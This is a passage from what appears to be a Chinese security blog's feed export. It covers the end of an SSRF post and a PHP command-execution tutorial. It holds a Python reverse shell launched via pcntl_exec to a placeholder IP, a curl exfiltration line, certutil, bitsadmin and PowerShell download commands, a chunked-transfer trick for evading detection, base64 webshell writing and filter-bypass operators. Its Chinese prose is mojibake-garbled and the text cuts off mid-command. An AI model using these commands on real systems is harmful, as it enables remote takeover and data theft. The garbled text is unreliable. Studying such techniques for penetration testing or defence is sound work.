â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h2 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h2><p><img src="/../images/image-20230603222133775.png" alt="image-20230603222133775"></p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li>ç¦æ­¢é‡å®šå‘è·³è½¬</li><li>è®¾ç½®URLç™½åå•ï¼ˆé™åˆ¶å¯ä»¥è®¿é—®çš„URLï¼‰</li><li>ç¦æ­¢ä¸éœ€è¦çš„åè®®</li><li>é™åˆ¶ç«¯å£</li><li>é‰´æƒï¼Œå¦‚cookieï¼Œjwtç­‰ï¼Œå½“æ”»å‡»è€…åªèƒ½æ§åˆ¶ä¸€ä¸ªurlæ—¶ï¼Œè€Œæ— æ³•æ·»åŠ è¿™äº›è¯·æ±‚å¤´æ—¶ï¼Œå°±æ— æ³•è®¿é—®æŸäº›æ¥å£</li><li>æ ¡éªŒäº†å…¶ä»–http headerå­—æ®µæ—¶ï¼Œå¦‚refererï¼ŒUAç­‰</li></ul><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.wangan.com/articles/1238#59315b">https://www.wangan.com/articles/1238#59315b</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p><p><a href="https://joychou.org/web/phpssrf.html#directory0811578052187574410">https://joychou.org/web/phpssrf.html#directory0811578052187574410</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h1><p>åº”ç”¨ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå½“é»‘å®¢èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„çš„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚</p><h1 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()å’Œåå¼•å·</span><br><span class="line"><span class="title function_ invoke__">popen</span>()ï¼Œ<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤æœ‰å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( å‘½ä»¤ï¼Œç»“æœæ•°ç»„ ï¼ŒçŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾ï¼Œè¦æƒ³è·å¾—ç»“æœï¼Œå°±è¦è¾“å‡ºç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„çŠ¶æ€ç ä¸º0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( å‘½ä»¤, çŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†<code>sh -c &quot;command&quot;</code>å‘½ä»¤</p><p><strong>system()å‡½æ•°</strong>æ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( å‘½ä»¤, çŠ¶æ€ç   )</span><br></pre></td></tr></table></figure><p>å’Œ<strong>systemå‡½æ•°</strong>ç±»ä¼¼ï¼Œæ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="shell-exec-å’Œ-åå¼•å·"><a href="#shell-exec-å’Œ-åå¼•å·" class="headerlink" title="shell_exec()å’Œ åå¼•å·"></a><strong>shell_exec()å’Œ åå¼•å·</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( å‘½ä»¤ )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()å‡½æ•°</strong>é»˜è®¤æ— å›æ˜¾ï¼Œé€šè¿‡ <strong>echo</strong> å¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· () æ“ä½œç¬¦çš„å˜ä½“ï¼Œå½“ç¦ç”¨shell_execæ—¶ï¼Œ&#96; ä¹Ÿä¸å¯æ‰§è¡Œ</strong></p><p>åå¼•å·åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤**<code>command</code><strong>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼</strong><code>mode</code>**ï¼Œæœ‰<code>r</code>å’Œ<code>w</code>ä»£è¡¨è¯»å’Œå†™ã€‚</p><p>å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>ä¸<code>popen()</code>ç±»ä¼¼ï¼Œåªæ˜¯å¯ä»¥å¼€ä¸¤ä¸ªç®¡é“ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯ </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“ </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹ stream_get_contents â€” è¯»å–èµ„æºæµåˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h2><p>å‰ææ¡ä»¶ï¼š<strong>PHPå®‰è£…å¹¶å¯ç”¨äº†pcntlæ’ä»¶</strong></p><p>pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒphpçš„å¤šçº¿ç¨‹æ“ä½œã€‚å¾ˆå¤šæ—¶å€™ä¼šç¢°åˆ°ç¦ç”¨execå‡½æ•°çš„æƒ…å†µï¼Œä½†å¦‚æœè¿ç»´äººå‘˜å®‰å…¨æ„è¯†ä¸å¼ºæˆ–å¯¹PHPä¸ç”šäº†è§£ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½å¿½ç•¥pcntlæ‰©å±•çš„ç›¸å…³å‡½æ•°ã€‚</p><p>pcntl_exec()æ˜¯pcntlæ’ä»¶ä¸“æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ï¼Œå¯ä»¥åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</p><p>åˆ©ç”¨pcntl_exec()æ‰§è¡Œtest.shï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºpcntl_exec()æ‰§è¡Œå‘½ä»¤æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥å…¶å¸¸ä¸pythonç»“åˆæ¥åå¼¹shellï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;ip&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure><h1 id="æ— å›æ˜¾åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"><a href="#æ— å›æ˜¾åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹" class="headerlink" title="æ— å›æ˜¾åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"></a>æ— å›æ˜¾åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹</h1><ul><li><p>è·¯å¾„å¤§å°å†™æ•æ„Ÿ</p></li><li><p>nmap</p></li><li><p>å¤–å¸¦å‘½ä»¤æ‰§è¡Œç»“æœ</p></li><li><p>é€šè¿‡<code>ping</code>å‘½ä»¤</p><blockquote><p>Windowsä¸‹çš„Pingå‘½ä»¤æ¯é—´éš”ä¸€ç§’ä¼šå‘é€ä¸€ä¸ªICMP ECHO_REQUEST åŒ…ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ Ping å‘½ä»¤æ¥è¿‘ä¼¼åœ°æ¨¡æ‹Ÿç­‰å¾…æŒ‡å®šç§’æ•°çš„æ•ˆæœ</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146.png" alt="image-20230519171119146"></p></li></ul><h1 id="æ— å›æ˜¾ä¹‹é‡å®šå‘ç»•è¿‡"><a href="#æ— å›æ˜¾ä¹‹é‡å®šå‘ç»•è¿‡" class="headerlink" title="æ— å›æ˜¾ä¹‹é‡å®šå‘ç»•è¿‡"></a>æ— å›æ˜¾ä¹‹é‡å®šå‘ç»•è¿‡</h1><p>å…ˆå»ç½‘ç«™ä¸Šæ‰¾ä¸€ä¸ªé™æ€æ–‡ä»¶xxx</p><ul><li><p>Linux</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name xxx|<span class="keyword">while</span> <span class="built_in">read</span> f;<span class="keyword">do</span> sh -c <span class="string">&#x27;echo [base64ç¼–ç çš„å†…å®¹] | base64 -d&#x27;</span> &gt;$(<span class="built_in">dirname</span> <span class="variable">$f</span>)/test.txt;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°åä¸ºâ€xxxâ€çš„æ–‡ä»¶ï¼Œåœ¨æ¯ä¸ªæ‰¾åˆ°çš„æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºâ€test.txtâ€çš„æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹è®¾ç½®ä¸ºå‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate xxx|<span class="keyword">while</span> <span class="built_in">read</span> f;<span class="keyword">do</span> sh -c <span class="string">&#x27;echo [base64ç¼–ç çš„å†…å®¹] | base64 -d&#x27;</span>&gt;$(<span class="built_in">dirname</span> <span class="variable">$f</span>)/test.txt;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><blockquote><p>locateåœ¨æ•°æ®åº“ä¸­ç´¢å¼•æ›´å¿«</p></blockquote></li><li><p>Windows</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b [è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦]:\[æŸ¥æ‰¾çš„æ–‡ä»¶]&#x27;</span>) <span class="keyword">do</span> (<span class="built_in">echo</span> <span class="string">&quot;[å†™å…¥çš„å†…å®¹]&quot;</span> &gt; %i\..\[å†™å…¥çš„æ–‡ä»¶åå­—]) </span><br><span class="line"></span><br><span class="line"><span class="comment"># base64</span></span><br><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b [è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦]:\[æŸ¥æ‰¾çš„æ–‡ä»¶]&#x27;</span>) <span class="keyword">do</span> (<span class="built_in">echo</span> [<span class="built_in">base64</span>ç¼–ç çš„å†…å®¹] &gt; %i\..\[å†™å…¥çš„æ–‡ä»¶åå­—])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨certutilè§£ç </span></span><br><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b c:\base64-hm-test.txt&#x27;</span>) <span class="keyword">do</span> (certutil.exe -decode %i\..\base64-hm-test.txt %i\..\1.php) </span><br></pre></td></tr></table></figure></li></ul><h1 id="æ— å›æ˜¾ä¹‹åå¼¹shell"><a href="#æ— å›æ˜¾ä¹‹åå¼¹shell" class="headerlink" title="æ— å›æ˜¾ä¹‹åå¼¹shell"></a>æ— å›æ˜¾ä¹‹åå¼¹shell</h1><p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><h1 id="å‡ºç½‘ä¹‹è¿œç¨‹æ–‡ä»¶ä¸‹è½½"><a href="#å‡ºç½‘ä¹‹è¿œç¨‹æ–‡ä»¶ä¸‹è½½" class="headerlink" title="å‡ºç½‘ä¹‹è¿œç¨‹æ–‡ä»¶ä¸‹è½½"></a>å‡ºç½‘ä¹‹è¿œç¨‹æ–‡ä»¶ä¸‹è½½</h1><p><a href="https://www.cnblogs.com/yokan/p/16069234.html">Windows&amp;Linuxæ–‡ä»¶ä¼ è¾“æ–¹å¼æ€»ç»“ - yokan - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://lolbas-project.github.io/%EF%BC%9A%E7%B1%BB%E4%BC%BC%E4%BA%8Egtfobins">https://lolbas-project.github.io/ï¼šç±»ä¼¼äºgtfobins</a></p><h1 id="æ— å›æ˜¾å§¿åŠ¿"><a href="#æ— å›æ˜¾å§¿åŠ¿" class="headerlink" title="æ— å›æ˜¾å§¿åŠ¿"></a>æ— å›æ˜¾å§¿åŠ¿</h1><ul><li><p>åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠ¥é”™</span><br><span class="line">å»¶æ—¶</span><br></pre></td></tr></table></figure></li><li><p>åå¼¹shell</p><p>åœ¨çº¿ç”Ÿæˆï¼š<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>å¤–å¸¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>ä¸å‡ºç½‘+DNSè¯·æ±‚å‡ºç½‘</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>å°†æ–‡ä»¶ç§»åŠ¨åˆ°å¯è®¿é—®ç›®å½•ï¼ˆç½‘ç«™ç›®å½•ï¼Œé™æ€ æ–‡ä»¶ç›®å½•ï¼‰</p><ul><li><p>è¯»å–å†…å®¹é‡å®šå‘å†™å…¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>å¤åˆ¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºé“¾æ¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="å‡ºç½‘"><a href="#å‡ºç½‘" class="headerlink" title="å‡ºç½‘"></a>å‡ºç½‘</h2><ul><li><p>è¿œç¨‹ä¸‹è½½</p><p><a href="https://paper.seebug.org/834/">æ€»ç»“</a></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n <span class="string">&#x27;ä¸‹è½½åœ°å€&#x27;</span> <span class="string">&#x27;ä¿å­˜åœ°å€&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;ä¸‹è½½åœ°å€&#x27;</span>,[<span class="string">&#x27;ä¿å­˜åœ°å€&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ä¸‹è½½æ–‡ä»¶: certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&#x27;ä¸‹è½½åœ°å€&#x27;</span> [<span class="string">&#x27;ä¿å­˜åœ°å€&#x27;</span>]</span><br><span class="line">åˆ é™¤ç¼“å­˜: certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&#x27;ä¸‹è½½åœ°å€&#x27;</span> delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»•è¿‡æ‰‹æ®µä¹‹åŒå†™certutil</span></span><br><span class="line">certutil &amp; certutil .....</span><br><span class="line"><span class="comment"># ç»•è¿‡æ‰‹æ®µä¹‹åˆ†å—ä¼ è¾“</span></span><br><span class="line">CertUtil -encode fscan.exe fscan_base64.txt <span class="comment"># ç¼–ç </span></span><br><span class="line">cmd=powershell -c <span class="string">&quot;&#x27;Â§Â§&#x27; | Out-File C:\fscan_base64.txt -Append&quot;</span> <span class="comment">#PowerShellè¿½åŠ å†™å…¥</span></span><br><span class="line">certutil -decode fscan_base64.txt fscan.exe <span class="comment"># certutilè¿˜åŸæ–‡ä»¶</span></span><br></pre></td></tr></table></figure></li><li><p>é‡å®šå‘å†™å…¥</p><blockquote><p><strong>webshellç‰¹æ®Šç¬¦å·é—®é¢˜ï¼Œå¯ä»¥å…ˆåšbase64ç¼–ç å†™å…¥ï¼Œç„¶åå†è§£ç </strong></p></blockquote></li></ul><h1 id="å‘½ä»¤æ‰§è¡Œç»•è¿‡å§¿åŠ¿"><a href="#å‘½ä»¤æ‰§è¡Œç»•è¿‡å§¿åŠ¿" class="headerlink" title="å‘½ä»¤æ‰§è¡Œç»•è¿‡å§¿åŠ¿"></a>å‘½ä»¤æ‰§è¡Œç»•è¿‡å§¿åŠ¿</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"><a href="#å¤šæ¡å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"></a>å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h3><table><thead><tr><th align="center"></th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td></tr><tr><td align="center">ï¼›</td><td align="center">ä¾æ¬¡æ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">||</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">&amp;</td><td align="center">å³ä½¿å‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸä¹Ÿä¼šæ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">æ¢è¡Œæ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr><tr><td align="center">$()</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr></tbody></table><h3 id=""><a href="#" class="headerlink" title="."></a>.</h3><p>Linux ä¸­ï¼Œ<code>.</code>ä¹Ÿå«<code>period</code>ï¼Œå®ƒçš„ä½œç”¨å’Œ<code>source</code>ä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„ shell æ˜¯ bashï¼Œåˆ™ <code>. filename</code>çš„æ„æ€å°±æ˜¯ç”¨ bash æ‰§è¡Œ filename æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ul><li>base64</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 